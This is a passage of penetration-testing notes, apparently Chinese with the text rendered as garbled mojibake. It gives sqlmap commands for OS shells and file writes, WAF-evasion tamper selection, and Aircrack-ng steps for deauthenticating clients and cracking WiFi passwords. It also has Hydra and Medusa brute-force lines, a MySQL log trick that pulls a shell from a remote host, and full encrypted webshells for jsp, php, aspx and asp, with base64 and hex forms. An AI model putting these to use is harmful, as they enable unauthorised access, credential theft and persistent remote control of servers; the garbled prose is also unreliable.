**ï¼ˆ3ï¼‰GPCä¸ºoffï¼Œphpä¸»åŠ¨è½¬ä¹‰çš„åŠŸèƒ½å…³é—­**

éƒ½èƒ½ä¸Šä¼ äº†,ç›´æ¥ä¼ ä¸€ä¸ªä¸€å¥è¯ä¸é¦™å—?

```
sqlmap -r â€œc:\tools\request.txtâ€ -p id â€“dms mysql â€“os-shell
```

**è¯»å–ä¸å†™å…¥æ–‡ä»¶**

é¦–å…ˆæ‰¾éœ€è¦ç½‘ç«™çš„ç‰©ç†è·¯å¾„ï¼Œå…¶æ¬¡éœ€è¦æœ‰å¯å†™æˆ–å¯è¯»æƒé™ã€‚

â€“file-read=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶ ï¼ˆç‰©ç†è·¯å¾„ï¼‰
â€“file-write=WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„**æœ¬åœ°æ–‡ä»¶** ï¼ˆmssql xp_shellï¼‰
â€“file-dest=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„**ç»å¯¹è·¯å¾„**
\#å†™ç¤ºä¾‹ï¼š

```
sqlmap -r â€œc:\request.txtâ€ -p id â€“dbms mysql â€“file-dest â€œe:\php\htdocs\dvwa\inc\include\1.phpâ€ â€“file-write â€œf:\webshell\1112.phpâ€
```

#è¯»ç¤ºä¾‹

```
sqlmap -r â€œc:\request.txtâ€ -p id â€“dbms mysql â€“file-read="e:\www\as\config.php"
```

#æ³¨ï¼šmysqlä¸æ”¯æŒåˆ—ç›®å½•ï¼Œä»…æ”¯æŒè¯»å–å•ä¸ªæ–‡ä»¶ã€‚sqlserverå¯ä»¥åˆ—ç›®å½•ï¼Œä¸èƒ½è¯»å†™æ–‡ä»¶ï¼Œä½†éœ€è¦ä¸€ä¸ªï¼ˆxp_dirtreeå‡½æ•°ï¼‰



#### Tamperä½¿ç”¨

è¿™é‡Œæ¨ä¸€ä¸ªå·¥å…·,å¯ä»¥è‡ªåŠ¨é€‰æ‹©tamper

https://github.com/m4ll0k/Atlas

**ä½¿ç”¨**

å…ˆç”¨sqlmap è·‘ä¸€ä¸‹æ³¨å…¥ç‚¹(éœ€è¦è¾“å‡ºä½¿ç”¨çš„payload)

1. Run SQLMap:

```
$ python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3
```

[![sqlmap](img/68747470733a2f2f692e696d6775722e636f6d2f5850333952717a2e706e67)](https://camo.githubusercontent.com/3f5610b30b3956708d21ae3fa8e8f4333565d4ceb1b51f2a106eeff514229f04/68747470733a2f2f692e696d6775722e636f6d2f5850333952717a2e706e67)

`Price_ASC') AND 8716=4837 AND ('yajr'='yajr` is blocked by WAF/IDS/IPS, now trying with Atlas:

æ‹¿åˆ°ä½¿ç”¨çš„payload,ä½¿ç”¨atlas.pyæ¥æŸ¥æ‰¾å¯ç”¨çš„tamper

```
$ python atlas.py --url 'http://site.com/index.php?id=Price_ASC' --payload="') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v
```

[![atlas_succ](img/68747470733a2f2f692e696d6775722e636f6d2f553671456e58702e706e67)](https://camo.githubusercontent.com/ec060487c40814c93aecbe7cc7709addd789f65d9b07386f656ea85167709f94/68747470733a2f2f692e696d6775722e636f6d2f553671456e58702e706e67)

æ‰¾åˆ°å,å°±å¯ä»¥ç›´æ¥ä½¿ç”¨(ä¸Šé¢æ‰¾åˆ°versionedkeywords)

```
$ python sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3 --tamper=versionedkeywords
```



### Aircrack-ngç ´è§£WIFIå¯†ç 

å‚è€ƒhttps://blog.csdn.net/qq_36119192/article/details/84254622

ç ´è§£æ— çº¿wifiå¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š

- æŸ¥çœ‹ç½‘å¡åå­—ï¼šiwconfig
- è®¾ç½®ç½‘å¡ä¸ºç›‘å¬æ¨¡å¼ï¼šairmon-ng start wlan0
- æ‰«æé™„è¿‘çš„WIFIï¼šairodump-ng wlan0mon
- é€‰å®šä¸€ä¸ªè·¯ç”±å™¨ï¼Œå¹¶ç›‘å¬å…¶æµé‡ï¼šairodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon
- é€‰å®šè¿æ¥çš„ä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œè¿›è¡Œæ”»å‡»ï¼šaireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon
- å¯¹æŠ“å–åˆ°çš„capåŒ…è¿›è¡Œæš´åŠ›ç ´è§£ï¼šaircrack-ng  -w  password.txt  -b BC:46:99:3D:66:D6 tplink-01.cap 

æŸ¥çœ‹æ— çº¿ç½‘å¡åå­—ï¼šiwconfig  æˆ–è€… ifconfig -a  éƒ½å¯ä»¥

![img](img/20181119155904820.png)

å¼€å¯ç½‘å¡ç›‘å¬æ¨¡å¼ï¼šairmon-ng start wlan0  ã€‚ç½‘å¡å¼€å¯äº†ç›‘å¬æ¨¡å¼ä¹‹åç½‘å¡çš„åå­—å°±å˜ä¸º wlan0mon äº†ï¼Œä»¥åçš„æ‰€æœ‰å‘½ä»¤ä¸­çš„ç½‘å¡åéƒ½æ˜¯å« wlan0mon

![img](img/20181119155959216.png)

æ‰«æé™„è¿‘çš„WIFIï¼šairodump-ng wlan0mon ï¼Œä¼šæ˜¾ç¤ºé™„è¿‘æ‰€æœ‰çš„WIFIä¿¡å·ã€‚

- BSSIDä»£è¡¨è·¯ç”±å™¨çš„ MAC åœ°å€
- PWR ä»£è¡¨ä¿¡å·çš„å¼ºåº¦ï¼Œæ•°å€¼è¶Šå¤§ä»£è¡¨ä¿¡æ¯è¶Šå¼º
- CH ä»£è¡¨ä¿¡é“
- ENCä»£è¡¨ç”¨çš„åŠ å¯†çš„æ–¹å¼
- AUTH ä»£è¡¨è®¤è¯çš„æ–¹å¼
- ESSIDæ˜¯WIFIçš„åå­—

æˆ‘ä»¬éœ€è¦é€‰å®šä¸€ä¸ªå‡†å¤‡ç ´è§£çš„WIFIï¼Œæˆ‘ä»¬é€‰ tplink-5

![img](img/20181119160153813.png)

ç›‘å¬è¯¥è·¯ç”±å™¨çš„æµé‡ï¼š

```python
airodump-ng -w tplink -c 11 --bssid BC:46:99:3D:66:D6 wlan0mon   # -w å‚æ•°æŒ‡å®šç”Ÿæˆçš„æ–‡ä»¶å  -c æŒ‡å®šä¿¡é“ --bssidæŒ‡å®šè·¯ç”±å™¨çš„MACåœ°å€ 
```

ä¹Ÿå¯ä»¥ç›‘å¬æ•´ä¸ªä¿¡é“çš„è·¯ç”±å™¨æµé‡:

```
airodump-ng -w tplink -c 11 wlan0mon   # -w å‚æ•°æŒ‡å®šç”Ÿæˆçš„æ–‡ä»¶å  -c æŒ‡å®šä¿¡é“ 
```

ä¸‹é¢çš„ STATION æ˜¯è¿æ¥è¯¥WIFIçš„å®¢æˆ·ç«¯ï¼Œä¸‹é¢è¿™é‡Œåªæœ‰ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥äº†è¯¥WIFIã€‚å¦‚æœæœ‰å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥çš„è¯ï¼Œæˆ‘ä»¬æœ€å¥½é€‰æ‹©æ´»è·ƒç‚¹çš„å®¢æˆ·ç«¯ã€‚

![img](img/20181119165219125.png)

é‡æ–°æ‰“å¼€ä¸€ä¸ªå‘½ä»¤è¡Œçª—å£(ä¹‹å‰çš„ç›‘å¬ä¸è¦å…³é—­)ï¼Œå¼€å§‹æ”»å‡»ï¼ä¹‹å‰çš„çª—å£ç»§ç»­ä¿ç•™ï¼Œç”¨äºè§‚å¯Ÿæ˜¯å¦æŠ“åŒ…æˆåŠŸ

```python
aireplay-ng -0 50 -a BC:46:99:3D:66:D6 -c A0:AF:BD:D8:E6:31  wlan0mon  # 50æ˜¯å‘åŒ…çš„æ•°é‡ -aæŒ‡å®šè·¯ç”±å™¨çš„MACåœ°å€  -cæŒ‡å®šè¿æ¥çš„å®¢æˆ·ç«¯çš„MACåœ°å€ 
```

è¯¥å‘½ä»¤ä¼šæ‰“æ–­è¿æ¥å®¢æˆ·ç«¯å’ŒWIFIä¹‹é—´çš„è¿æ¥ï¼Œç­‰åˆ°å®¢æˆ·ç«¯é‡æ–°è¿æ¥WIFIçš„æ—¶å€™ï¼Œå°±ä¼šæŠ“å–ä»–ä»¬ä¹‹é—´çš„æ¡æ‰‹è®¤è¯åŒ…ï¼ 

![img](img/20181119164552615.png)

å¦‚æœåœ¨ç›‘å¬çª—å£çœ‹åˆ°ä¸‹é¢çº¢è‰²åœˆä½çš„è¿™äº›ï¼Œå°±è¯´æ˜æ¡æ‰‹åŒ…æŠ“å–æˆåŠŸäº†(æ²¡æŠ“åˆ°å¯ä»¥å¤šè¯•å‡ æ¬¡,ç›´åˆ°æŠ“åŒ…æˆåŠŸä¸ºæ­¢)

![img](img/20181119164947823.png)

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¼šç”Ÿæˆå››ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æˆ‘ä»¬æœ‰ç”¨çš„æ–‡ä»¶æ˜¯ä»¥ cap åç¼€ç»“å°¾çš„æ–‡ä»¶

![img](img/20181119165829983.png)

å¯¹æŠ“å–åˆ°çš„capåŒ…è¿›è¡Œç ´è§£ï¼Œè¿™éœ€è¦æˆ‘ä»¬å‡†å¤‡å¥½ç ´è§£çš„å¯†ç å­—å…¸ã€‚æ‰€ä»¥ï¼Œæ— è®ºæ˜¯ä»»ä½•ç ´è§£ï¼Œéƒ½éœ€è¦ä¸€ä¸ªå¼ºå¤§çš„å¯†ç å­—å…¸ï¼

kaliä¸‹è‡ªå¸¦æœ‰ä¸€ä»½æ— çº¿å¯†ç å­—å…¸â€”â€”> /usr/share/wordlists/rockyou.txt.gz ï¼Œæˆ‘ä»¬å°†å…¶è§£å‹

![img](img/20190519130854576.png)

![img](img/2019051913123037.png)

```python
aircrack-ng  -w  /usr/share/wordlists/rockyou.txt  -b  BC:46:99:3D:66:D6 tplink-01.cap #-wæŒ‡å®š å¯†ç å­—å…¸ -bæŒ‡å®šè·¯ç”±å™¨çš„MACåœ°å€
```

å¯ä»¥çœ‹åˆ°ï¼Œç ´è§£æˆåŠŸï¼è¯¥WIFIçš„å¯†ç ä¸º www.123.com 

![img](img/2018111916443643.png)

ä»æœ€åå¯ä»¥çœ‹å‡ºï¼Œè¦æƒ³ç ´è§£å‡ºWIFIçš„å¯†ç ï¼Œè¿˜æ˜¯å¾—éœ€è¦ä¸€ä¸ªå¾ˆå¼ºå¤§çš„å­—å…¸ï¼







### çˆ†ç ´æ”»å‡»

#### Hydra

```
å‚æ•°ï¼š
-l æŒ‡å®šçš„ç”¨æˆ·å -L ç”¨æˆ·åå­—å…¸
-p æŒ‡å®šå¯†ç  -P å¯†ç å­—å…¸
-s æŒ‡å®šç«¯å£ 
-o è¾“å‡ºæ–‡ä»¶
-t ä»»åŠ¡æ•°é»˜è®¤16
-f çˆ†ç ´æˆåŠŸä¸€ä¸ªå°±åœæ­¢
-v æŠ¥é”™æ—¥å¿—è¯¦ç»† -V æ”»å‡»æ—¥å¿—
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
>hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV
>hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
```

#### Medusa

```
å‚æ•°ï¼š
-h ç›®æ ‡åæˆ–IP  -H ç›®æ ‡åˆ—è¡¨
-u ç”¨æˆ·å -U ç”¨æˆ·åå­—å…¸
-p å¯†ç  -P å¯†ç å­—å…¸ -f çˆ†ç ´æˆåŠŸåœæ­¢ -M æŒ‡å®šæœåŠ¡ -t çº¿ç¨‹
-n æŒ‡å®šç«¯å£ -e ns å°è¯•ç©ºå¯†ç å’Œç”¨æˆ·åå¯†ç ç›¸åŒ
>medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
>medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
```



# getshellæ–¹æ³•



## åˆ©ç”¨JavaScriptè½¬å†™php

https://xz.aliyun.com/t/9181

ä¸ºäº†é¿å…æ‹¦æˆªphpä»£ç çš„wafï¼Œæˆ‘è¿™é‡Œè¿œç¨‹ä¸‹è½½çš„è„šæœ¬æ˜¯åˆ©ç”¨JavaScriptè½¬å†™php

```sql
SET global general_log_file='C:/Users/Administrator/Desktop/UPUPW_AP5.5_64/htdocs/11.php';
SELECT '<script language="php"> $a="http://x.x.x.x:81/shell.txt";$b="file"."_g"."et_"."contents";$b = $b($a);file_put_contents("shell.php",$b); </script>'
```

è®¿é—®11.php å°±ä¼šç”Ÿæˆshell.php
è¿™é‡Œçš„shellä¹Ÿæ˜¯ç”¨äº†å“¥æ–¯æ‹‰çš„å…æ€shell



## å‘½ä»¤æ‰§è¡Œå†™shell

```
echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d > /var/www/html/shell.php

echo \<\?php eval\(\@\$_POST\[1\]\)\; \?\> >1.php

```



https://www.anquanke.com/post/id/245019

**Windows**

åœ¨windowsä¸»è¦çš„å†™å…¥æ–¹æ³•ï¼Œæˆ‘ä¸»è¦ç”¨ä»¥ä¸‹ä¸¤ç§ï¼š

```
set /p=è¦å†™çš„å†…å®¹<nul > C:\11.txt
echo è¦å†™çš„å†…å®¹ > C:\11.txt
```

åœ¨windowsä¸­ï¼Œæ‰¹å¤„ç†éœ€è¦è½¬ä¹‰å­—ç¬¦ä¸»è¦æœ‰ â€œ&â€ï¼Œâ€œ|â€ï¼Œâ€œ<â€ï¼Œâ€œ>â€ç­‰ç­‰ï¼Œè½¬ä¹‰å­—ç¬¦ä¸ºâ€^â€

ä¸‹é¢ä»¥echoä¸ºä¾‹ï¼Œå†™å…¥å†°èå„è„šæœ¬è¯­è¨€shellï¼Œå…¶ä¸­éœ€è¦è½¬ä¹‰çš„ä¸œè¥¿ï¼Œæˆ‘å·²ç»å¸®å„ä½è¡¨å“¥è½¬è¿‡äº†ï¼Œæ‹¿æ¥ç›´æ¥ç”¨å³å¯ï¼š

**ï¼ˆ1ï¼‰jsp**

```
echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^>^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^>^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> > 111.jsp
```

**ï¼ˆ2ï¼‰jspx**

```
echo ^<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"^>^<jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/^>^<jsp:declaration^> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}^</jsp:declaration^>^<jsp:scriptlet^>String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);^</jsp:scriptlet^>^</jsp:root^> > 111.jspx
```

**ï¼ˆ3ï¼‰php**

```
echo ^<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl'))^{$t="base64_"."decode";$post=$t($post."");for($i=0;$i^<strlen($post);$i++) ^{$post[$i] = $post[$i]^^$key[$i+1^&15]; ^}^}else^{$post=openssl_decrypt($post, "AES128", $key);^}$arr=explode('^|',$post);$func=$arr[0];$params=$arr[1];class C^{public function __invoke($p) ^{eval($p."");^}^}@call_user_func(new C(),$params);?^> > 111.php
```

**ï¼ˆ4ï¼‰java9 jsp**

```
echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^>^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^>^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b"; session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> > 111.jsp
```

**ï¼ˆ5ï¼‰aspx**

```
echo ^<%@ Page Language="C#" %^>^<%@Import Namespace="System.Reflection"%^>^<%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%^> > 111.aspx
```

**ï¼ˆ6ï¼‰asp**

```
echo ^<% >> 111.asp&echo Response.CharSet = "UTF-8" >> 111.asp&echo k="e45e329feb5d925b" >> 111.asp&echo Session("k")=k >> 111.asp&echo size=Request.TotalBytes >> 111.asp&echo content=Request.BinaryRead(size) >> 111.asp&echo For i=1 To size >> 111.asp&echo result=result^&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))) >> 111.asp&echo Next >> 111.asp&echo execute(result) >> 111.asp&echo %^> >> 111.asp
```



**ï¼ˆ1ï¼‰certutil-Base64**

```
echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= > 111.txt

certutil -f -decode 111.txt C:\\111.jsp
```

**ï¼ˆ2ï¼‰certutil-Hex**

```
echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e > 111.txt

certutil -decodehex 111.txt C:\\111.jsp
```

**ï¼ˆbï¼‰Linux**

åœ¨Linuxä¸­ï¼Œéœ€è¦è½¬ä¹‰å­—ç¬¦ä¸»è¦æ˜¯ å•å¼•å· æˆ–è€…åŒå¼•å· å¯¹äºå•å¼•å·ï¼Œæˆ‘ä»¬å°†å…¶æ›¿æ¢ä¸º\47å³å¯ã€‚

**ï¼ˆ1ï¼‰jsp**

```
echo '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>' > 111.jsp
```

**ï¼ˆ2ï¼‰jspx**

```
echo '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>' > 111.jspx
```

**ï¼ˆ3ï¼‰php**

```
echo -e '<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION[\047k\047]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded(\047openssl\047)){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++) {$post[$i] = $post[$i]^$key[$i+1&15]; }}else{$post=openssl_decrypt($post, "AES128", $key);}$arr=explode(\047|\047,$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p) {eval($p."");}}@call_user_func(new C(),$params);?> ' > 111.php
```

**ï¼ˆ4ï¼‰aspx**

```
echo '<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>' > 111.aspx
```

**ï¼ˆ5ï¼‰asp**

```
echo -e '<%\nResponse.CharSet = "UTF-8" \nk="e45e329feb5d925b" \nSession("k")=k\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1)))\nNext\nexecute(result)\n%>' > 111.asp
```

**Linux**

å’Œwindowsä¸åŒï¼Œlinuxåœ¨é€”ä¸­å°±å·²ç»è½¬æ¢å®Œæ¯•ï¼Œè½åœ°æ–‡ä»¶å·²ç»æˆä¸ºshellã€‚å¤§éƒ¨åˆ†ç©å®¶éƒ½æ˜¯æ‡’å¾—è½¬ä¹‰shellä¸­çš„å­—ç¬¦ï¼Œè€Œä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•ã€‚ä¸»è¦ä¹Ÿæ˜¯åˆ†base64ä»¥åŠhexä¸¤ç§ã€‚

**ï¼ˆ1ï¼‰jsp**

```
echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= |base64 -d > 111.jsp

echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e|xxd -r -ps > 111.jsp
```

**ï¼ˆ2ï¼‰jspx**

```
echo PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+IGNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD5TdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYygoc2Vzc2lvbi5nZXRWYWx1ZSgidSIpKyIiKS5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7PC9qc3A6c2NyaXB0bGV0PjwvanNwOnJvb3Q+|base64 -d > 111.jsp

echo 3c6a73703a726f6f7420786d6c6e733a6a73703d22687474703a2f2f6a6176612e73756e2e636f6d2f4a53502f50616765222076657273696f6e3d22312e32223e3c6a73703a6469726563746976652e7061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a222f3e3c6a73703a6465636c61726174696f6e3e20636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d3c2f6a73703a6465636c61726174696f6e3e3c6a73703a7363726970746c65743e537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563282873657373696f6e2e67657456616c756528227522292b2222292e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b3c2f6a73703a7363726970746c65743e